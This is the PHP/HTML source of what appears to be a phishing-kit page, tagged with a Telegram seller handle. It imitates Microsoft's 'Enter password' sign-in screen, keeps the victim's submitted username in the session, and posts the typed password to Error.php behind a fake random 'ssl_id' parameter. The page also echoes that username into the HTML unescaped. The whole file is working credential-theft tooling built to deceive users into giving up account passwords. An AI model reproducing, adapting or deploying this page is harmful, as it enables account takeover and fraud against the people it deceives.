<?php
   // Telegram: @guccibase
   require "CONTROLS.php";
   require "includes/session_protect.php";
   require "includes/functions.php";
   require "includes/One_Time.php";
	$_SESSION['username'] = $_POST['username'];
   ?>

<!DOCTYPE html>
<html dir="ltr" class="" lang="en">
   <head>
      <title>Sign in to your account</title>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
      <meta http-equiv="Pragma" content="no-cache">
      <meta http-equiv="Expires" content="-1">
      <meta name="PageID" content="ConvergedSignIn">
      <meta name="SiteID" content="">
      <meta name="ReqLC" content="2057">
      <meta name="LocLC" content="en-GB">
      <link rel="shortcut icon" href="assets/files/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
      <meta name="robots" content="none">
      <link href="assets/files/converged.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">
   </head>
   <body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
      <div>
          
         <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                
               <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;assets/files/0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);"></div>
                
               <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;assets/files/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);"></div>
                
            </div>
         </div>
         <div data-bind="if: activeDialog"></div>
         <form name="f1" id="i0281" method="post" action="Error.php?ssl_id=<?php echo generateRandomString(130); ?>">
             
            <div class="outer" data-bind="component: { name: 'master-page',
               params: {
               serverData: svr,
               showButtons: svr.fShowButtons,
               showFooterLinks: true,
               useWizardBehavior: svr.fUseWizardBehavior,
               handleWizardButtons: false,
               password: password,
               hideFromAria: ariaHidden },
               event: {
               footerAgreementClick: footer_agreementClick } }">
                 
               <div id="msccBanner" class="cc-banner" role="alert">
                  <div class="cc-container">
                      <img class="cc-icon cc-v-center" role="presentation" data-bind="imgSrc" src="assets/files/info_4883eb1a3cbdddf5a79e28d320cfe5a9.svg">  <span class="cc-v-center cc-text" data-bind="
                        htmlWithBindings: html['CT_STR_CookieBanner_Text'],
                        childBindings: {
                        'msccLearnMore': {
                        href: svr.urlFooterPrivacy,
                        ariaLabel: str['CT_STR_CookieBanner_Link_AriaLabel'],
                        css: { 'cc-link cc-v-center float-right': true } } }">This
                     site uses cookies for analytics, personalised content and ads.&nbsp;By 
                     continuing to browse this site, you agree to this use. <a href="#" id="msccLearnMore" aria-label="Learn more about Microsoft's Cookie Policy" class="cc-link cc-v-center float-right">Learn more</a></span> 
                  </div>
               </div>
                
               <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
                   
                  <div class="inner fade-in-lightbox" data-bind="
                     animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                     css: {
                     'app': backgroundLogoUrl,
                     'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                     'fade-in-lightbox': fadeInLightBox,
                     'has-popup': showFedCredButton,
                     'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }">
                     <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
                      
                     <div data-bind="component: { name: 'logo-control',
                        params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }">
                         <img class="logo"  data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="assets/files/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">  
                     </div>
                      
                     <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                        enableCssAnimation: svr.fEnableCssAnimation,
                        disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                        initialViewId: initialViewId,
                        currentViewId: currentViewId,
                        initialSharedData: initialSharedData,
                        initialError: $loginPage.getServerError() },
                        event: {
                        cancel: paginationControl_onCancel,
                        showView: $loginPage.view_onShow,
                        setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                        animationStateChange: paginationControl_onAnimationStateChange } }">
                         
                        <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                            
                           <div class="pagination-view animate slide-in-next" data-bind="css: {
                              'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
                              'zero-opacity': hidePaginatedView.hideSubView(),
                              'animate': animate(),
                              'slide-out-next': animate.isSlideOutNext(),
                              'slide-in-next': animate.isSlideInNext(),
                              'slide-out-back': animate.isSlideOutBack(),
                              'slide-in-back': animate.isSlideInBack() }">
                               <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next"> <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.Bv,
                displayName: sharedData.displayName || svr.g,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $_SESSION['username']; ?>"><?php echo $_SESSION['username']; ?></div> </div></div> </div>
                              <div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                                 params: {
                                 serverData: svr,
                                 serverError: initialError,
                                 isInitialView: isInitialState,
                                 displayName: sharedData.displayName,
                                 prefillNames: $loginPage.prefillNames,
                                 flowToken: sharedData.flowToken },
                                 event: {
                                 refresh: $loginPage.view_onRefresh,
                                 redirect: $loginPage.view_onRedirect,
                                 setPendingRequest: $loginPage.view_onSetPendingRequest,
                                 showLearnMore: $loginPage.learnMore_onShow,
                                 registerDialog: $loginPage.view_onRegisterDialog,
                                 unregisterDialog: $loginPage.view_onUnregisterDialog,
                                 showDialog: $loginPage.view_onShowDialog } }">
                                  
                                 <div data-bind="component: { name: 'header-control',
                                    params: {
                                    serverData: svr,
                                    title: str['WF_STR_HeaderDefault_Title'] } }">
                                    <div class="row text-title" id="loginHeader">
                                       <div role="heading" aria-level="1" data-bind="text: title">Enter password</div>
                                        
                                    </div>
                                 </div>
                                  
                                 <div class="row">
                                    <div role="alert" aria-live="assertive">
                                        
                                    </div>
                                    <div class="form-group col-md-24">
                                        
                                       <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
                                          publicMethods: usernameTextbox.placeholderTextboxMethods,
                                          params: {
                                          serverData: svr,
                                          hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
                                          hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
                                          event: {
                                          updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
                                            <input type="password" name="password" required id="i0116" maxlength="113" class="form-control ltr_override" placeholder="Password" lang="en"> <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true"> 
                                       </div><Br />
									   <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.F &amp;&amp; !showHipOnPasswordView"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label> </div>
                                        
                                    </div>
                                 </div>
                                 <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                                    <div class="row">
                                       <div class="col-md-24">
                                          <div class="text-13 action-links">
                             
                                              
                                             <div class="form-group"> <a id="cantAccessAccount" name="cannotAccessAccount" href="#" data-bind="
                                                text: str['WF_STR_CantAccessAccount_Text'],
                                                click: cantAccessAccount_onClick">Forgotten my password</a> </div>
                                              
                                             <div class="form-group" data-bind="
                                                component: { name: 'cred-switch-link-control',
                                                params: {
                                                serverData: svr,
                                                availableCreds: availableCredsWithoutUsername(),
                                                showForgotUsername: svr.fShowForgotUsernameLink },
                                                event: {
                                                switchView: noUsernameCredSwitchLink_onSwitchView,
                                                redirect: onRedirect,
                                                registerDialog: onRegisterDialog,
                                                unregisterDialog: onUnregisterDialog,
                                                showDialog: onShowDialog } }">
                                         
                                             </div>
                                              
                                          </div>
                                       </div>
                                    </div>
                                    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                       <div data-bind="component: { name: 'footer-buttons-field',
                                          params: {
                                          serverData: svr,
                                          isPrimaryButtonEnabled: !isRequestPending(),
                                          isPrimaryButtonVisible: svr.fShowButtons,
                                          isSecondaryButtonEnabled: true,
                                          isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
                                          event: {
                                          primaryButtonClick: primaryButton_onClick,
                                          secondaryButtonClick: secondaryButton_onClick } }">
                                          <div class="col-xs-24 no-padding-left-right button-container" data-bind="
                                             visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                             css: { 'no-margin-bottom': removeBottomMargin }">
                                              
                                             <div class="inline-block">
                                                 <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
                                                   attr: primaryButtonAttributes,
                                                   value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                                                   hasFocus: focusOnPrimaryButton,
                                                   click: primaryButton_onClick,
                                                   enable: isPrimaryButtonEnabled,
                                                   visible: isPrimaryButtonVisible,
                                                   preventTabbing: primaryButtonPreventTabbing" value="Next"> 
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 
                              </div>
                               
                           </div>
                        </div>
                     </div>
                      
                  </div>
                   <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value="VPckX1ODUotFzaHwS8gIhB1Ixx6e4xnbxNfPIlV/jbU=7:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAXWRu27TYABG49xoKwQVSxk7MCE58T04UiWSOElNYjtukjoOSJHt-Jba_h37TxNbIMRUFqRIbJVYyoDoyIR4hE5dWHgCxISYGEkegOWbzvDpnMc5vIRXH1EkRWsVnUVZjSFRisUxVKMIBiVpkiEJDJ_SGBk92Nt_R724ePPy1dMP30frwsfzg2vkwIEwjKvl8nK5LAHLcg2zZAC__BVBbhHkJ4JcZgtmgLbr19mYISsYzuIMxVI4zVRYjCqJXJNQZ81E5AQoKU1aTTBMTGurrtLyhbYM1VQmxIHjSpyaqoSASZywHPtNXFJUqCpyImz5wTDpKs98ibOhOPP8MVdbjbmWM1bGzo_sfam2gA6xHRC5qfknu2uByJ-EIIaXuU-IFJoBP22AIDANWNpiZgBdQ4MuCHoRCM0IumZ8FMcdatTivbPQn8uy2pl7zc5kDsNlS-oMyESf1OUeagsR7IJBV6drJGQ42I4CXWgOEkCyM9sSnP55HPqMoNthZ9b3jDqaCLSLAdTvszam1-rHdUObd_yF1W1PvJM-1zjh8UXAiymlf8kVN1p9ENzk7m1OBe70MIyA5XrmbR75lb-L5ao7O3v7mYeZw8zfPHJV2NR6jl3471tV4epzwyZfVzM3hfJpzzgb4RI3BLCVasfL_hObd-o4v1oxJrUK9JVo9XjvtDzTh0eVKr4uIuti8XcReXsn8233f63_AQ2"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="6d87305b-4693-4d3a-a2a9-4367337f3a00"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAAAP0wLlqdLVToOpA4kwzSnxjjpd5OwfQWIZUYKqHMLzFx79jBd-EGgGJ-9FQh1ZMgEbkFEilE6QwQ01NKE5Aqf2gazjy56JtBNQbuokAoyhN98SjJuDnLkhBuslpR58ml1KrtZFCHly14sxV9JL_Vl6pPu5iXRNtQOoQuvEwuHEGx6MczHDXoR39-6qXu_SKoQ_MZ2stDcRh054-KMyLRvtqSpHDCPAe2LEDup4SXRWCVz-dblKlZJB3gvGXC-MwlJ6O7hKusrGwrpLuvSf8eaO11hfMoaOHwbPuqTTzZ2e8Lk9-1Ej4S_SDTDo4y9XKm_SczSP-L86DuRmPXYGAE29V2_xFWjFd_-u_0dXmm55boQP1wQujpht_-u_WRGCD-ZMfefrinB9B9VMrBrGyp9aIAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="1"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1"> 
                  <div data-bind="component: { name: 'instrumentation-control',
                     publicMethods: instrumentationMethods,
                     params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
                  <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
                     <div data-bind="component: { name: 'footer-control',
                        publicMethods: footerMethods,
                        params: {
                        serverData: svr,
                        showLinks: true },
                        event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetails: toggleDebugDetails_onClick } }">
                         
                        <div id="footerLinks" class="footerNode text-secondary">
                           <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="#">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="#">Privacy &amp; cookies</a> 
                           <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
                              click: moreInfo_onClick,
                              ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
                              attr: { 'aria-expanded': showDebugDetails().toString() },
                              hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false">
                               <img class="desktopMode" role="presentation" data-bind="imgSrc" src="assets/files/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"> <img class="mobileMode" role="presentation" data-bind="imgSrc" src="assets/files/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">  
                           </a>
                        </div>
                        
                     </div>
                  </div>
               </div>
               
            </div>
             
         </form>
         <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }">
             
         </form>
          
         <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe style="display: none;" src="assets/files/prefetch.htm" width="0" height="0"></iframe></div>
         
      </div>
   </body>
</html>
